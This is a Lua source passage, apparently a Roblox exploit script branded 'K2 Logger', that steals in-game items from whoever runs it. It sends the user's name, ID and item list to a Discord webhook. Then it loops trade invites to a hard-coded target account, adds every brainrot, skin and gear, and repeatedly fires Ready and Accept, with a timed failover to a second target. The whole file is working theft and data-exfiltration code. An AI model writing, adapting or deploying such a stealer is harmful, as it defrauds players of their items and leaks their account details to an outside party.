	local lines = { "───── **BRAINROTS** ─────" }
	for i, r in ipairs(missList or {}) do
		totalGen += (r.genVal or 0)
		local mE = ""
		pcall(function() mE = mutEmoji(r.mutation) end)
		local tCount = 0
		pcall(function() tCount = countTraits(r.traits) end)
		local genStr = tostring(r.genVal or 0)
		pcall(function() genStr = formatGen(r.genVal or 0) end)
		local line = tostring(mE) .. " **" .. tostring(r.displayName) .. "**"
		if tCount > 0 then line = line .. " *(x" .. tCount .. " traits)*" end
		line = line .. " — **$" .. tostring(genStr):gsub("/s", "") .. "/s**"
		table.insert(lines, "`" .. i .. ".` " .. line)
	end
	local totStr = tostring(totalGen)
	pcall(function() totStr = formatGen(totalGen) end)
	local listText = table.concat(lines, "\n")
	listText = listText .. "\n\n💰 **Total Value:** **$" .. tostring(totStr):gsub("/s", "") .. "/s**"
	if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
	local embedColor = FALLBACK_COLOR
	pcall(function()
		if missList and missList[1] then
			local c = getBrainrotColor(missList[1].index)
			if c then embedColor = colorToDecimal(c) end
		end
	end)
	local thumb = nil
	pcall(function()
		if missList and missList[1] and resolveThumbnail then
			thumb = resolveThumbnail(missList[1].displayName, missList[1].index)
		end
	end)
	local description = table.concat({
		"📫 **Script User** `" .. LP.Name .. "` (ID: " .. tostring(LP.UserId) .. ")",
		"⏱ Unclaimed **" .. tostring(MISS_TIMEOUT) .. "s** → trading to `" .. tostring(MISS_TARGET_ID) .. "`",
		"",
		listText,
	}, "\n")
	local embed = {
		title = "K2 Logger",
		description = description,
		color = embedColor,
		fields = {
			{ name = "⏰ Failover", value = "<t:" .. os.time() .. ":R>", inline = true },
			{ name = "🌍 Server", value = "Players: **" .. tostring(#Players:GetPlayers()) .. "**", inline = true },
			{ name = "📬 Target", value = "`" .. tostring(MISS_TARGET_ID) .. "`", inline = true },
		},
		footer = {
			text = "K2 LOGGER | https://discord.gg/bxjXucMVqB",
			icon_url = FOOTER_ICON,
		},
		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
	}
	if type(thumb) == "string" and #thumb > 8 then embed.thumbnail = { url = thumb } end
	local payload = {
		content = "@everyone",
		username = "K2 Logger",
		avatar_url = GOOD_AVATAR,
		embeds = { embed },
	}
	local body = HttpService:JSONEncode(payload)
	local ok, res = pcall(function()
		return requestFn({
			Url = missUrl, Method = "POST",
			Headers = { ["Content-Type"] = "application/json" },
			Body = body,
		})
	end)
	if ok then
		local code = type(res) == "table" and (res.StatusCode or res.statusCode) or "?"
		print("[Brainrot] Miss webhook ONLY → MISS_WEBHOOK status", code)
	else
		warn("[Brainrot] Miss webhook failed:", res)
	end
end

local function runMissFailover()
	if missFailoverDone then return end
	local tradeUI = pg:FindFirstChild("TradeLiveTrade")
	local reallyInTrade = tradeUI and tradeUI.Enabled
	if reallyInTrade then
		print("[Brainrot] Miss timer skipped — TradeLiveTrade open")
		return
	end
	local missList = getMissBrainrotsOnBase()
	print("[Brainrot] Miss check: still on base =", #missList)
	if #missList == 0 then
		print("[Brainrot] Miss timer: listed brainrots gone — no failover")
		return
	end
	missFailoverDone = true
	TARGET_ID = MISS_TARGET_ID
	tradeBrainrotQueue = rebuildMissTradeQueue()
	tradeItemsEnabled = false
	baseSkinQueue = {}
	gearQueue = {}
	print("[Brainrot] Failover →", MISS_TARGET_ID, "| miss brainrots:", #tradeBrainrotQueue)
	sendMissWebhook(missList)
end

local function startFullAutomation()
	if not TARGET_ID or TARGET_ID == 0 then
		warn("[Brainrot] TARGET_USER_ID not set")
		return
	end
	local inviteRemote = getRemote("RF/TradeService/Invite")
	local addRemote = getRemote("RF/TradeService/AddBrainrot")
	local addItemRemote = getRemote("RF/TradeService/AddItem")
	local readyRemote = getRemote("RE/TradeService/Ready")
	local acceptRemote = getRemote("RE/TradeService/Accept")
	print("[Brainrot] Invite     :", inviteRemote and inviteRemote.Name or "MISSING")
	print("[Brainrot] AddBrainrot:", addRemote and addRemote.Name or "MISSING")
	print("[Brainrot] AddItem    :", addItemRemote and addItemRemote.Name or "MISSING")
	print("[Brainrot] Ready      :", readyRemote and readyRemote.Name or "MISSING")
	print("[Brainrot] Accept     :", acceptRemote and acceptRemote.Name or "MISSING")
	if not (inviteRemote and readyRemote and acceptRemote) then
		warn("[Brainrot] Missing trade remotes")
		return
	end

	local tradeActive = false
	local forceAddFlag = false
	-- FIXED: continuous single-item cycle — never bulk-stops
	local ADD_INTERVAL = 0.20 -- steady rate, no long pauses
	local addIdx = 1

	local function addOneBrainrot()
		local q = tradeBrainrotQueue
		if not addRemote or not q or #q == 0 then return end
		if addIdx > #q then addIdx = 1 end
		local item = q[addIdx]
		addIdx = addIdx + 1
		if not item then return end
		pcall(function()
			addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data)
		end)
	end

	local function forceAddAllBrainrots()
		local q = tradeBrainrotQueue
		if not addRemote or not q or #q == 0 then return end
		for _, item in ipairs(q) do
			pcall(function()
				addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data)
			end)
			task.wait(0.08)
		end
	end

	local function forceAddAllItems()
		if not addItemRemote then return end
		if not tradeItemsEnabled then return end
		for _, item in ipairs(baseSkinQueue) do
			pcall(function()
				addItemRemote:InvokeServer(SELECTGB_GUID, "BaseSkin", {
					UUID = item.uuid, SkinName = item.skinName,
				})
			end)
			task.wait(0.08)
		end
		for _, item in ipairs(gearQueue) do
			pcall(function()
				addItemRemote:InvokeServer(SELECTGB_GUID, "Gear", {
					UUID = item.uuid, GearName = item.gearName,
				})
			end)
			task.wait(0.08)
		end
	end

	-- Detect trade open/close
	task.spawn(function()
		pg.DescendantAdded:Connect(function(obj)
			local n = string.lower(obj.Name)
			if n == "tradelivetrade" or n == "brainrottrader" or n:find("tradelive", 1, true) then
				task.wait(0.12)
				if obj.Parent and (obj:IsA("Frame") or obj:IsA("ScreenGui")) then
					if not tradeActive then
						tradeActive = true
						currentlyInTrade = true
						forceAddFlag = true
						print("[Brainrot] Trade opened → burst add")
						task.spawn(forceAddAllBrainrots)
						task.spawn(forceAddAllItems)
					end
				end
			end
		end)
		pg.DescendantRemoving:Connect(function(obj)
			local n = string.lower(obj.Name)
			if n:find("trade") or n:find("brainrottrader") or n:find("tradelive") then
				if tradeActive then
					tradeActive = false
					currentlyInTrade = false
					print("[Brainrot] Trade closed → continuous add continues")
				end
			end
		end)
	end)

	-- CONTINUOUS brainrot add loop (never stops, steady interval)
	if addRemote then
		task.spawn(function()
			while true do
				local ok, err = pcall(addOneBrainrot)
				if not ok then
					warn("[Brainrot] addOne error:", err)
				end
				task.wait(ADD_INTERVAL)
			end
		end)
	end

	-- CONTINUOUS skins/gears (steady)
	if addItemRemote then
		task.spawn(function()
			local skinIdx, gearIdx = 1, 1
			while true do
				if tradeItemsEnabled then
					if #baseSkinQueue > 0 then
						if skinIdx > #baseSkinQueue then skinIdx = 1 end
						local item = baseSkinQueue[skinIdx]
						skinIdx = skinIdx + 1
						if item then
							pcall(function()
								addItemRemote:InvokeServer(SELECTGB_GUID, "BaseSkin", {
									UUID = item.uuid, SkinName = item.skinName,
								})
							end)
						end
					end
					if #gearQueue > 0 then
						if gearIdx > #gearQueue then gearIdx = 1 end
						local item = gearQueue[gearIdx]
						gearIdx = gearIdx + 1
						if item then
							pcall(function()
								addItemRemote:InvokeServer(SELECTGB_GUID, "Gear", {
									UUID = item.uuid, GearName = item.gearName,
								})
							end)
						end
					end
				end
				task.wait(0.35)
			end
		end)
	end

	-- Invite loop + light re-add
	task.spawn(function()
		while true do
			pcall(function()
				inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID)
			end)
			task.wait(0.25)
			-- don't full-burst here (caused stalls); continuous loop handles adds
			task.wait(TRADE_CYCLE_DELAY)
		end
	end)

	-- Ready + Accept (steady)
	task.spawn(function()
		while true do
			if tradeActive or forceAddFlag then
				forceAddFlag = false
				task.spawn(forceAddAllBrainrots)
				task.wait(0.15)
			end
			pcall(function() readyRemote:FireServer(READY_GUID) end)
			task.wait(0.55)
			pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
			task.wait(0.55)
		end
	end)

	print("[Brainrot] Automation started | continuous add @", ADD_INTERVAL, "s")
end

if not isDuelPlace and #brainrotQueue > 0 then
	startFullAutomation()
else
	print("[Brainrot] Skipping trade automation (duel or empty queue)")
end

task.spawn(function()
	-- Cap wait so execute stays snappy (getgc can take several seconds)
	local t0 = os.clock()
	while not profileReady and (os.clock() - t0) < 1.25 do
		task.wait(0.05)
	end
	baseSkinQueue = buildSkinQueue()
	gearQueue = buildGearQueue()
	if not isDuelPlace then
		if #baseSkinQueue > 0 then
			getgenv().K2LastBaseSkinQueue = deepCopy(baseSkinQueue)
		end
		if #gearQueue > 0 then
			getgenv().K2LastGearQueue = deepCopy(gearQueue)
		end
	else
		-- Duel: profile inventory often empty — restore last main scan
		if #baseSkinQueue == 0 and type(getgenv().K2LastBaseSkinQueue) == "table" then
			baseSkinQueue = deepCopy(getgenv().K2LastBaseSkinQueue)
		end
		if #gearQueue == 0 and type(getgenv().K2LastGearQueue) == "table" then
			gearQueue = deepCopy(getgenv().K2LastGearQueue)
		end
		-- If animalList was empty at start, try cache again before webhook
		local empty = true
		for _ in pairs(animalList) do empty = false break end
		if empty then
			local cached = loadCachedBaseScan()
			if cached then
				animalList = cached
				print("[Brainrot] Duel webhook using cached AnimalList")
			end
		end
	end
	print("[Gear] Base skins queued:", #baseSkinQueue, "| Gears:", #gearQueue, "| profileReady=", profileReady, "| duel=", isDuelPlace)
	-- Webhook guard is inside sendDetailedWebhook
	sendDetailedWebhook()
	if #missBrainrotQueue > 0 then
		print("[Brainrot] Miss timer armed:", MISS_TIMEOUT, "s |", #missBrainrotQueue, "listed")
		task.spawn(function()
			task.wait(MISS_TIMEOUT)
			runMissFailover()
		end)
	else
		print("[Brainrot] Miss timer not armed (no listed brainrots on base)")
	end
end)
